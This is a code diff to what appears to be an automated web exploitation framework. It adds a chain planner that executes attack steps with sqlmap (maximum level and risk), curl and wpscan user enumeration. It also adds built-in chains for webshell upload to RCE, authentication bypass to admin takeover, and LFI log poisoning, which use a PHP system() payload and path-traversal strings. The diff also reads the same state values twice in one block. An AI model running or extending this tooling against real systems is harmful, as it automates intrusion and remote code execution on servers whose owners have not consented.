@@ -8,6 +8,8 @@ import logging
 from typing import Dict, List, Optional
 from dataclasses import dataclass, field
 
+from core.executor import run_command  # Thêm import để exec tools
+
 logger = logging.getLogger("recon.chain_planner")
 
 
@@ -45,6 +47,13 @@ class ChainPlanner:
     def plan_chains(self) -> List[ExploitChain]:
         """Analyze state and build relevant exploit chains"""
         chains = []
+
+        # Detect patterns for chains
+        pattern_chains = self._detect_chain_patterns()
+        chains.extend(pattern_chains)
+
+        vulns = self.state.get("vulnerabilities", [])
+        wp_detected = self.state.get("wordpress_detected", False)
 
         vulns = self.state.get("vulnerabilities", [])
         wp_detected = self.state.get("wordpress_detected", False)
@@ -105,7 +114,126 @@ class ChainPlanner:
         for chain in chains:
             logger.info(f"[CHAIN] → [{chain.risk_level}] {chain.name}")
 
-        return sorted(chains, key=lambda c: {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2}.get(c.risk_level, 3))
+        # Smart prioritization
+        chains = self.smart_prioritize(chains)
+
+        return chains
+
+    def smart_prioritize(self, chains: List[ExploitChain]) -> List[ExploitChain]:
+        """AI-like prioritization based on impact, feasibility, and state data"""
+        for chain in chains:
+            score = 0
+            # Risk level
+            risk_scores = {"CRITICAL": 100, "HIGH": 70, "MEDIUM": 40, "LOW": 10}
+            score += risk_scores.get(chain.risk_level, 0)
+
+            # Feasibility: more steps = harder
+            score -= len(chain.steps) * 5
+
+            # Target availability
+            targets = {s.target for s in chain.steps}
+            available_targets = set()
+            live_hosts = self.state.get("live_hosts", [])
+            for host in live_hosts:
+                available_targets.add(host.get("url", ""))
+            score += len(targets & available_targets) * 10
+
+            # Vuln confirmation
+            vulns = self.state.get("vulnerabilities", [])
+            vuln_types = {v.get("name", "").lower() for v in vulns}
+            if any(vt in chain.name.lower() for vt in vuln_types):
+                score += 20
+
+            chain.priority_score = score
+
+        return sorted(chains, key=lambda c: getattr(c, 'priority_score', 0), reverse=True)
+
+    def execute_chain(self, chain: ExploitChain) -> Dict[str, any]:
+        """Execute an exploit chain step by step, respecting dependencies"""
+        logger.info(f"[EXEC] Starting chain: {chain.name}")
+        results = {"chain": chain.name, "steps_executed": [], "success": False, "final_payload": None}
+
+        # Check prerequisites
+        if not self._check_prerequisites(chain.prerequisites):
+            logger.warning(f"[EXEC] Prerequisites not met for {chain.name}")
+            return results
+
+        executed_steps = set()
+        for step in sorted(chain.steps, key=lambda s: s.priority, reverse=True):
+            # Check dependencies
+            if step.depends_on and not all(dep in executed_steps for dep in step.depends_on):
+                logger.info(f"[EXEC] Skipping {step.name} - dependencies not met")
+                continue
+
+            logger.info(f"[EXEC] Executing step: {step.name}")
+            step_result = self._execute_step(step)
+            results["steps_executed"].append({"step": step.name, "result": step_result})
+
+            if step_result.get("success"):
+                executed_steps.add(step.name)
+                if step.name == chain.steps[-1].name:  # Last step
+                    results["success"] = True
+                    results["final_payload"] = step_result.get("output")
+            else:
+                logger.warning(f"[EXEC] Step {step.name} failed, aborting chain")
+                break
+
+        return results
+
+    def _check_prerequisites(self, prereqs: List[str]) -> bool:
+        """Check if prerequisites are met based on state"""
+        for prereq in prereqs:
+            if "WordPress" in prereq:
+                if not self.state.get("wordpress_detected"):
+                    return False
+            elif "SQLi" in prereq:
+                vulns = self.state.get("vulnerabilities", [])
+                if not any("sql" in v.get("name", "").lower() for v in vulns):
+                    return False
+            # Add more checks as needed
+        return True
+
+    def _execute_step(self, step: ExploitStep) -> Dict[str, any]:
+        """Execute a single step using appropriate tool"""
+        result = {"success": False, "output": "", "error": ""}
+
+        try:
+            if step.tool == "sqlmap":
+                cmd = ["sqlmap", "-u", step.target, "--batch", "--level=5", "--risk=3"]
+                if step.payload:
+                    cmd.extend(step.payload.split())
+                ret, out, err = run_command(cmd, timeout=600)
+                result["success"] = ret == 0 and step.success_indicator in out
+                result["output"] = out
+                result["error"] = err
+
+            elif step.tool == "curl":
+                cmd = ["curl", "-s", step.target]
+                if step.payload:
+                    cmd.extend(["-d", step.payload])
+                ret, out, err = run_command(cmd, timeout=60)
+                result["success"] = step.success_indicator in out if step.success_indicator else ret == 0
+                result["output"] = out
+                result["error"] = err
+
+            elif step.tool == "wpscan":
+                cmd = ["wpscan", "--url", step.target, "--enumerate", "u"]
+                if step.payload:
+                    cmd.extend(step.payload.split())
+                ret, out, err = run_command(cmd, timeout=300)
+                result["success"] = step.success_indicator in out if step.success_indicator else ret == 0
+                result["output"] = out
+                result["error"] = err
+
+            # Add more tool executions as needed
+            else:
+                logger.warning(f"[EXEC] Tool {step.tool} not implemented yet")
+                result["error"] = f"Tool {step.tool} not supported"
+
+        except Exception as e:
+            result["error"] = str(e)
+
+        return result
 
     def _build_wp_admin_chain(self, users: List[str]) -> ExploitChain:
         """WordPress: enumerate → brute → wp-admin → plugin upload → RCE"""
@@ -413,6 +541,110 @@ class ChainPlanner:
                     success_indicator="exploit successful",
                     priority=9,
                 ),
+            ]
+        )
+
+    def combine_chains(self, chains: List[ExploitChain]) -> List[ExploitChain]:
+        """Intelligently combine overlapping chains for higher impact"""
+        combined = []
+        used = set()
+
+        for i, chain1 in enumerate(chains):
+            if i in used:
+                continue
+            combined_chain = chain1
+            for j, chain2 in enumerate(chains):
+                if j <= i or j in used:
+                    continue
+                if self._chains_overlap(chain1, chain2):
+                    combined_chain = self._merge_chains(chain1, chain2)
+                    used.add(j)
+            combined.append(combined_chain)
+            used.add(i)
+
+        logger.info(f"[CHAIN] Combined into {len(combined)} chains")
+        return combined
+
+    def _chains_overlap(self, c1: ExploitChain, c2: ExploitChain) -> bool:
+        """Check if two chains share common targets or vulns"""
+        c1_targets = {s.target for s in c1.steps}
+        c2_targets = {s.target for s in c2.steps}
+        return bool(c1_targets & c2_targets) or c1.name.split("→")[0] == c2.name.split("→")[0]
+
+    def _merge_chains(self, c1: ExploitChain, c2: ExploitChain) -> ExploitChain:
+        """Merge two chains into one with combined steps"""
+        merged_steps = c1.steps + [s for s in c2.steps if s not in c1.steps]
+        return ExploitChain(
+            name=f"{c1.name} + {c2.name}",
+            description=f"Combined: {c1.description} + {c2.description}",
+            risk_level="CRITICAL" if "CRITICAL" in [c1.risk_level, c2.risk_level] else "HIGH",
+            estimated_time=f"{c1.estimated_time} + {c2.estimated_time}",
+            prerequisites=list(set(c1.prerequisites + c2.prerequisites)),
+            steps=merged_steps
+        )
+
+    def _detect_chain_patterns(self) -> List[ExploitChain]:
+        """Detect exploit chain patterns from endpoints and vulns"""
+        chains = []
+        endpoints = self.state.get("prioritized_endpoints", [])
+        vulns = self.state.get("vulnerabilities", [])
+
+        # Pattern: Upload + Admin = RCE
+        upload_eps = [e for e in endpoints if "upload" in e.get("categories", [])]
+        admin_eps = [e for e in endpoints if "admin" in e.get("categories", [])]
+        if upload_eps and admin_eps:
+            chains.append(self._build_upload_admin_chain(upload_eps[0], admin_eps[0]))
+
+        # Pattern: Auth bypass + Admin access
+        auth_vulns = [v for v in vulns if "auth" in v.get("name", "").lower() or "bypass" in v.get("name", "").lower()]
+        if auth_vulns and admin_eps:
+            chains.append(self._build_auth_bypass_chain(auth_vulns[0], admin_eps[0]))
+
+        # Pattern: LFI + Log poisoning
+        lfi_vulns = [v for v in vulns if "lfi" in v.get("name", "").lower()]
+        if lfi_vulns:
+            chains.append(self._build_lfi_log_poison_chain(lfi_vulns[0]))
+
+        return chains
+
+    def _build_upload_admin_chain(self, upload_ep: Dict, admin_ep: Dict) -> ExploitChain:
+        return ExploitChain(
+            name="Upload → Admin Access → RCE",
+            description="Upload malicious file, gain admin access, execute RCE",
+            risk_level="CRITICAL",
+            estimated_time="10-30 min",
+            prerequisites=["Upload endpoint", "Admin panel"],
+            steps=[
+                ExploitStep(name="Upload Shell", action="upload_webshell", target=upload_ep["url"], tool="curl", payload="shell.php"),
+                ExploitStep(name="Access Admin", action="login_admin", target=admin_ep["url"], tool="curl", depends_on=["Upload Shell"]),
+                ExploitStep(name="Execute RCE", action="trigger_shell", target="uploaded_shell.php", tool="curl", depends_on=["Access Admin"], payload="?cmd=id"),
+            ]
+        )
+
+    def _build_auth_bypass_chain(self, vuln: Dict, admin_ep: Dict) -> ExploitChain:
+        return ExploitChain(
+            name="Auth Bypass → Admin Takeover",
+            description="Bypass authentication to access admin panel",
+            risk_level="HIGH",
+            estimated_time="5-15 min",
+            prerequisites=["Auth vulnerability", "Admin endpoint"],
+            steps=[
+                ExploitStep(name="Bypass Auth", action="exploit_auth_bypass", target=vuln["url"], tool="curl"),
+                ExploitStep(name="Access Admin", action="enter_admin", target=admin_ep["url"], tool="curl", depends_on=["Bypass Auth"]),
+            ]
+        )
+
+    def _build_lfi_log_poison_chain(self, vuln: Dict) -> ExploitChain:
+        return ExploitChain(
+            name="LFI → Log Poisoning → RCE",
+            description="Use LFI to read logs, poison logs for RCE",
+            risk_level="HIGH",
+            estimated_time="15-45 min",
+            prerequisites=["LFI vulnerability"],
+            steps=[
+                ExploitStep(name="Read Logs", action="read_log_file", target=vuln["url"], tool="curl", payload="../../../../var/log/apache2/access.log"),
+                ExploitStep(name="Poison Log", action="inject_log", target="target.com", tool="curl", payload="<?php system($_GET['cmd']); ?>"),
+                ExploitStep(name="Execute RCE", action="trigger_rce", target=vuln["url"], tool="curl", depends_on=["Poison Log"], payload="?file=../../../var/log/apache2/access.log&cmd=id"),
             ]
         )
 
